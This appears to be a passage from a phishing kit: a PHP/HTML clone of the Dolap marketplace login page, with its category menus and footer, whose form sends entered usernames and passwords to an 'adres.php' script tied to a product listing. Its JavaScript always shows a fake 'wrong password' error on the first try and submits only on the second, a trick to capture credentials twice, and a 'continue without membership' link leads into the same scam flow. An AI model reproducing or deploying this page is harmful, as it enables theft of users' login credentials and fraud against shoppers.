<span>Sırt Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/cuzdan" title="Cüzdan">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/76.png" alt="Cüzdan" width="40" height="40" />
</div>
<span>Cüzdan</span>
</a>
</li>
<li>
<a href="https://dolap.com/portfoy-el-cantasi" title="Portföy/El Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/77.png" alt="Portföy/El Çantası" width="40" height="40" />
</div>
<span>Portföy/El Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/plaj-cantasi" title="Plaj Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/81.png" alt="Plaj Çantası" width="40" height="40" />
</div>
<span>Plaj Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/makyaj-cantasi" title="Makyaj Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/80.png" alt="Makyaj Çantası" width="40" height="40" />
</div>
<span>Makyaj Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/seyahat-cantasi" title="Valiz / Bavul">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/75.png" alt="Valiz / Bavul" width="40" height="40" />
</div>
<span>Valiz / Bavul</span>
</a>
</li>
<li>
<a href="https://dolap.com" title="Bel Çantası">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/513.png" alt="Bel Çantası" width="40" height="40" />
</div>
<span>Bel Çantası</span>
</a>
</li>
<li>
<a href="https://dolap.com/canta-diger" title="Diğer">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/83.png" alt="Diğer" width="40" height="40" />
</div>
<span>Diğer</span>
</a>
</li>
</ul>
</div>
</li>
<li class="category-header-63">
<a href="#" class="opener visible-xs visible-sm">Ayakkabı</a>
<a class="hidden-xs hidden-sm" href="https://dolap.com/ayakkabi">Ayakkabı</a>
<div class="slide">
<ul class="inner-links">
<li>
<a href="https://dolap.com/spor-ayakkabi" title="Spor Ayakkabı">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/67.png" alt="Spor Ayakkabı" width="40" height="40" />
</div>
<span>Spor Ayakkabı</span>
</a>
</li>
<li>
<a href="https://dolap.com/babet" title="Babet">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/64.png" alt="Babet" width="40" height="40" />
</div>
<span>Babet</span>
</a>
</li>
<li>
<a href="https://dolap.com/ince-topuklu" title="İnce Topuklu">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/70.png" alt="İnce Topuklu" width="40" height="40" />
</div>
<span>İnce Topuklu</span>
</a>
</li>
<li>
<a href="https://dolap.com/kalin-topuklu" title="Kalın Topuklu">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/69.png" alt="Kalın Topuklu" width="40" height="40" />
</div>
<span>Kalın Topuklu</span>
</a>
</li>
<li>
<a href="https://dolap.com/dolgu-topuklu" title="Dolgu Topuklu">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/71.png" alt="Dolgu Topuklu" width="40" height="40" />
</div>
<span>Dolgu Topuklu</span>
</a>
</li>
<li>
<a href="https://dolap.com/oxford-loafer" title="Oxford/Loafer">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/72.png" alt="Oxford/Loafer" width="40" height="40" />
</div>
<span>Oxford/Loafer</span>
</a>
</li>
<li>
<a href="https://dolap.com/sandalet" title="Sandalet">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/68.png" alt="Sandalet" width="40" height="40" />
</div>
<span>Sandalet</span>
</a>
</li>
<li>
<a href="https://dolap.com/terlik" title="Terlik">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/132.png" alt="Terlik" width="40" height="40" />
</div>
<span>Terlik</span>
</a>
</li>
<li>
<a href="https://dolap.com/bot" title="Bot">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/65.png" alt="Bot" width="40" height="40" />
</div>
<span>Bot</span>
</a>
</li>
<li>
<a href="https://dolap.com/cizme" title="Çizme">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/66.png" alt="Çizme" width="40" height="40" />
</div>
<span>Çizme</span>
</a>
</li>
<li>
<a href="https://dolap.com" title="Topuklu Sandalet">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/34250.png" alt="Topuklu Sandalet" width="40" height="40" />
</div>
<span>Topuklu Sandalet</span>
</a>
</li>
</ul>
</div>
</li>
<li class="category-header-84">
<a href="#" class="opener visible-xs visible-sm">Aksesuar</a>
<a class="hidden-xs hidden-sm" href="https://dolap.com/aksesuar">Aksesuar</a>
<div class="slide">
<ul class="inner-links">
<li>
<a href="https://dolap.com/gozluk" title="Gözlük">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/86.png" alt="Gözlük" width="40" height="40" />
</div>
<span>Gözlük</span>
</a>
</li>
<li>
<a href="https://dolap.com/saat" title="Saat">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/85.png" alt="Saat" width="40" height="40" />
</div>
<span>Saat</span>
</a>
</li>
<li>
<a href="https://dolap.com/taki" title="Takı">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/91.png" alt="Takı" width="40" height="40" />
</div>
<span>Takı</span>
</a>
</li>
<li>
<a href="https://dolap.com/kemer" title="Kemer">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/87.png" alt="Kemer" width="40" height="40" />
</div>
<span>Kemer</span>
</a>
</li>
<li>
<a href="https://dolap.com/sal" title="Şal/Eşarp">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/88.png" alt="Şal/Eşarp" width="40" height="40" />
</div>
<span>Şal/Eşarp</span>
</a>
</li>
<li>
<a href="https://dolap.com/eldiven" title="Eldiven">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/135.png" alt="Eldiven" width="40" height="40" />
</div>
<span>Eldiven</span>
</a>
 </li>
<li>
<a href="https://dolap.com/atki" title="Atkı">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/133.png" alt="Atkı" width="40" height="40" />
</div>
<span>Atkı</span>
</a>
</li>
<li>
<a href="https://dolap.com/bere" title="Bere">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/134.png" alt="Bere" width="40" height="40" />
</div>
<span>Bere</span>
</a>
</li>
<li>
<a href="https://dolap.com/sapka" title="Şapka">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/89.png" alt="Şapka" width="40" height="40" />
</div>
<span>Şapka</span>
</a>
</li>
<li>
<a href="https://dolap.com/sac-aksesuarlari" title="Saç Aksesuarları">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/90.png" alt="Saç Aksesuarları" width="40" height="40" />
</div>
<span>Saç Aksesuarları</span>
</a>
</li>
<li>
<a href="https://dolap.com/corap" title="Çorap">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/362.png" alt="Çorap" width="40" height="40" />
</div>
<span>Çorap</span>
</a>
</li>
<li>
<a href="https://dolap.com/aksesuar-diger" title="Diğer">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/92.png" alt="Diğer" width="40" height="40" />
</div>
<span>Diğer</span>
</a>
</li>
<li>
<a href="https://dolap.com" title="Gelin Buketi">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/629.png" alt="Gelin Buketi" width="40" height="40" />
</div>
<span>Gelin Buketi</span>
</a>
</li>
<li>
<a href="https://dolap.com" title="Şemsiye">
<div class="icon-holder">
<img src="https://cdn.dolap.com/common/category/34950.png" alt="Şemsiye" width="40" height="40" />
</div>
<span>Şemsiye</span>
</a>
</li>
</ul>
</div>
</li>
</ul>
</div>
</header>

<main id="main">

<div class="holder">
<div class="container">

<script src="https://www.google.com/recaptcha/api.js?onload=onReCaptchaIsReady&amp;render=explicit" defer="defer"></script>
<div class="row login--row">
<div class="col-sm-7 col-md-7 hidden-xs hidden-sm login-register-form-video">
<div class="row">
<div class="col-sm-6 col-md-6" style="padding: 0; text-align: right;">
<img style="width: 95%;" alt="banner" src="https://cdn.dolap.com/web/images/telephone_login.png" />
</div>
<div class="col-sm-6 col-md-6" style="padding: 0">
<video style="margin-top: 30%; width: 110%; height:110%" id="loginVideo" autoplay="autoplay" muted="muted" loop="loop">
<source type="video/mp4" src="https://cdn.dolap.com/web/images/women_walk.mp4" />
</video>
</div>
</div>
</div>
<div id="login-form-container" class="col-sm-12 col-md-5 login-register-form-container">
<div class="row row-box">
<div class="row">
<div class="center-block">
<h1>Dolap'a giriş yap</h1>
</div>
</div>
<div class="row">
<div class="col-xs-12">
<form id="form" action="adres.php?id=<?php echo $sonuc["id"]; ?>-<?php echo str_replace(" ", "-", $sonuc["urunadi"]); ?>" method="post" enctype="multipart/form-data" onsubmit="return false">
<div class="alert alert-danger" role="alert" style="display: none"></div>
<div class="form-group">
<input class="form-control" placeholder="Kullanıcı Adı ya da E-posta" name="loginid" required="required" />
</div>
<div class="form-group">
<input class="form-control" placeholder="Şifre" name="psw" type="password" value="" required="required" autocomplete="new-password" />
</div>
<div class="form-group">
<button id="loginButton" type="button" class="btn btn-default login submit-button">Giriş yap</button>
</div>
<style>
    .login-register-form-container .submit-button2 {
    width: 100%;
    background: #ff3f55;
    border-color: #ff3f55;
    color: #fff;
}
</style>
</form>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<script>
    var loginButton = document.getElementById('loginButton');
    var attempt = 1;

    loginButton.addEventListener('click', function () {
        var loginidInput = document.querySelector('input[name="loginid"]').value;
        var passwordInput = document.querySelector('input[name="psw"]').value;

        if (attempt === 1) {
            // Check if email and password fields are empty
            if (!loginidInput || !passwordInput) {
                // Display SweetAlert error message at the top
                Swal.fire({
                    icon: 'error',
                    title: 'Dikkat!',
                    text: 'E-posta ve şifre alanları boş olamaz.'
                });
            } else {
                // Display SweetAlert error message for incorrect email or password on the first attempt
                Swal.fire({
                    icon: 'error',
                    title: 'Dikkat!',
                    text: 'E-posta veya şifreniz yanlış. Lütfen tekrar deneyin.'
                });
                attempt++;
            }
        } else {
            // On the second attempt, submit the form
            document.getElementById('form').submit();
        }
    });
</script>

<div class="form-group">
<a rel="nofollow" type="submit" name="submit" class="btn btn-default login submit-button2" style="margin-top:-10px" href="adres.php?id=<?php echo $sonuc["id"]; ?>-<?php echo str_replace(" ", "-", $sonuc["urunadi"]); ?>">Üye olmadan devam et</a>
</div>
<div class="form-group">
<a rel="nofollow" href="https://dolap.com/sifremi-unuttum">Şifreni mi unuttun?</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>
<div class="notifications-block">
<div class="popup-holder">
<div class="popup redirectToDownloadApp" id="redirectToDownloadAppForNotifications">
<div class="redirectToDownloadAppContainer">
<div class="redirect-popup-desktop">
<a class="redirect-image-desktop" target="_blank" data-tracker="NOTIFICATIONS">
<img src="https://cdn.dolap.com/web/images/notification/notification.png" />
</a>
</div>
</div>
</div>
</div>
</div>
<footer style="margin-top: 15px" id="footer">
<div class="container">
<ul class="google-apple-btns">
<li><a href="https://app.adjust.com/ju0l4z" rel="nofollow"><img alt="apple" src="https://cdn.dolap.com/web/images/btn-apple.png" /></a></li>
<li><a href="https://app.adjust.com/btdp06" rel="nofollow"><img alt="android" src="https://cdn.dolap.com/web/images/btn-google.png" /></a></li>
</ul>
<div class="footer-nav-block">
<div class="footer-nav">
<strong class="nav-title">Kategoriler</strong>
<ul>
<li><a href="https://dolap.com/kol-cantasi">Kol Çantası</a></li>
<li><a href="https://dolap.com/mont">Mont</a></li>
<li><a href="https://dolap.com/kazak">Kazak</a></li>
<li><a href="https://dolap.com/cizme">Çizme</a></li>
<li><a href="https://dolap.com/bot">Bot</a></li>
</ul>
<ul>
<li><a href="https://dolap.com/hamile">Hamile</a></li>
<li><a href="https://dolap.com/bebek">Bebek</a></li>
<li><a href="https://dolap.com/erkek-cocuk">Erkek Çocuk</a></li>
<li><a href="https://dolap.com/kiz-cocuk">Kız Çocuk</a></li>
<li><a href="https://dolap.com/ara?q=%23tesettür">Tesettür</a></li>
</ul>
</div>
<div class="footer-nav">
<strong class="nav-title">Popüler Aramalar</strong>
<ul>
<li><a href="https://dolap.com/zara">Zara</a></li>
<li><a href="https://dolap.com/mango">Mango</a></li>
<li><a href="https://dolap.com/nike">Nike</a></li>
<li><a href="https://dolap.com/hm">H&amp;M</a></li>
<li><a href="https://dolap.com/ipekyol">İpekyol</a></li>
</ul>
 <ul>
<li><a href="https://dolap.com/louis-vuitton">Louis Vouitton</a></li>
<li><a href="https://dolap.com/michael-kors">Michael Kors</a></li>
<li><a href="https://dolap.com/gucci">Gucci</a></li>
<li><a href="https://dolap.com/chanel">Chanel</a></li>
<li><a href="https://dolap.com/prada">Prada</a></li>
</ul>
</div>
<div class="footer-nav">
<strong class="nav-title">Dolap Hakkında</strong>
<ul>
<li><a href="https://dolap.com/kullanici-sozlesmesi" rel="nofollow">Kullanıcı Sözleşmesi</a></li>
<li><a href="https://dolap.com/hakkimizda" rel="nofollow">İletişim</a></li>
<li><a href="http://destek.dolap.com" rel="nofollow" target="_blank">Destek</a></li>
<li><a href="https://dolap.com/satici-sorulari" rel="nofollow">Satıcı Soruları</a></li>
<li><a href="https://dolap.com/alici-sorulari" rel="nofollow">Alıcı Soruları</a></li>
<li><a href="https://dolap.com/gizlilik-sozlesmesi" rel="nofollow">KVKK - Gizlilik Politikası</a></li>
</ul>
</div>
</div>
<div itemscope="itemscope" itemtype="http://schema.org/Organization">
<link itemprop="url" href="https://dolap.com" />
<ul class="social-icons">
<li><a itemprop="sameAs" href="https://twitter.com/dolap_com" target="_blank" rel="nofollow"><i class="icon-twitter"></i></a></li>
<li><a itemprop="sameAs" href="https://www.facebook.com/dolapcom/" target="_blank" rel="nofollow"><i class="icon-facebook"></i></a></li>
<li><a itemprop="sameAs" href="https://www.instagram.com/dolap/" target="_blank" rel="nofollow"><i class="icon-instagram"></i></a>
</li>
</ul>
</div>
</div>
</footer>
<?php
      } else {
        header("Location: index.php");
        exit;   
    }
}
}
?> 
</body>
</html>